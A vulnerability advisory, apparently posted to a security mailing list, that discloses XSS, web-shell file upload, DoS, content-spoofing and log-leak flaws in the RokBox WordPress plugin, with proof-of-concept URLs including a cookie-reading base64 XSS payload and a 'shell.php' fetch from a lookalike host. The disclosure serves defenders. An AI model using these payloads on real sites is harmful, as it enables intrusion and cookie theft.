Subject: Multiple vulnerabilities in RokBox for WordPress

Hello list!

I want to warn you about multiple security vulnerabilities in plugin Rokbox 
for WordPress.

These are Cross-Site Scripting, Full path disclosure, Abuse of
Functionality, Denial of Service, Arbitrary File Upload, Content Spoofing
and Information Leakage vulnerabilities. Rokbox uses TimThumb 1.16 and JW
Player 4.4.198, so some of vulnerabilities are related to plugin itself,
some to TimThumb (vulnerabilities in which I've disclosed in 2011 and
developer fixed them after my informing) and some to JW Player
(vulnerabilities in which I've disclosed in 2012 and developer fixed them
after my informing).

-------------------------
Affected products:
-------------------------

Vulnerable are Rokbox 2.13 and previous versions.

To CS and XSS in JW Player and FPD are vulnerable all versions of Rokbox for
WordPress (Rokbox <= 2.13), but IL and vulnerabilities in TimThumb were
fixed. After my informing in August the developers changed TimThumb to
phpThumb, so version 2.13 isn't vulnerable to them.

XSS (WASC-08) (in versions of Rokbox with older versions of TimThumb):

Full path disclosure (WASC-13):

Abuse of Functionality (WASC-42):

http://site/wp-content/plugins/wp_rokbox/thumb.php?src=http://site.flickr.com&h=1&w=1
(bypass of restriction on domain, if such restriction is turned on)

DoS (WASC-10):

http://site/wp-content/plugins/wp_rokbox/thumb.php?src=http://site.flickr.com/big_file&h=1&w=1
(bypass of restriction on domain, if such restriction is turned on)

About such Abuse of Functionality and Denial of Service vulnerabilities you
can read in my article Using of the sites for attacks on other sites
(http://lists.grok.org.uk/pipermail/full-disclosure/2010-June/075384.html).

Arbitrary File Upload (WASC-31):

http://site/wp-content/plugins/wp_rokbox/thumb.php?src=http://flickr.com.site.com/shell.php

This Arbitrary File Upload vulnerability in TimThumb was disclosed last year
after 3,5 months after my disclosure of previous holes.

Content Spoofing (WASC-12):

In parameter file there can be set as video, as audio files.

Swf-file of JW Player accepts arbitrary addresses in parameters file and
image, which allows to spoof content of flash - i.e. by setting addresses of
video (audio) and/or image files from other site.

http://site/wp-content/plugins/wp_rokbox/thumb.php?file=1.flv&backcolor=0xFFFFFF&screencolor=0xFFFFFF
http://site/wp-content/plugins/wp_rokbox/thumb.php?file=1.flv&image=1.jpg

Content Spoofing (WASC-12):

Swf-file of JW Player accepts arbitrary addresses in parameter config, which
allows to spoof content of flash - i.e. by setting address of config file
from other site (parameters file and image in xml-file accept arbitrary
addresses). For loading of config file from other site it needs to have
crossdomain.xml.

http://site/wp-content/plugins/wp_rokbox/thumb.php?config=1.xml

1.xml

<config>
  <file>1.flv</file>
  <image>1.jpg</image>
</config>

Content Spoofing (WASC-12):

http://site/wp-content/plugins/wp_rokbox/jwplayer/jwplayer.swf?abouttext=Player&aboutlink=http://site

XSS (WASC-08):

http://site/wp-content/plugins/wp_rokbox/jwplayer/jwplayer.swf?abouttext=Player&aboutlink=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ%2B

Information Leakage (WASC-13):

http://site/wp-content/plugins/wp_rokbox/error_log

Leakage of error log with full paths.

Timeline:
------------ 

2012.08.24 - announced at my site.
2012.08.28 - informed developers.
2012.08.29 - developers answered that they will look at it.
2012.12.14 - disclosed at my site (http://websecurity.com.ua/6006/). The
developers haven't told me, which holes and in which versions they fixed,
but my checking of the last version of RokBox showed that they fixed only
part of the holes.
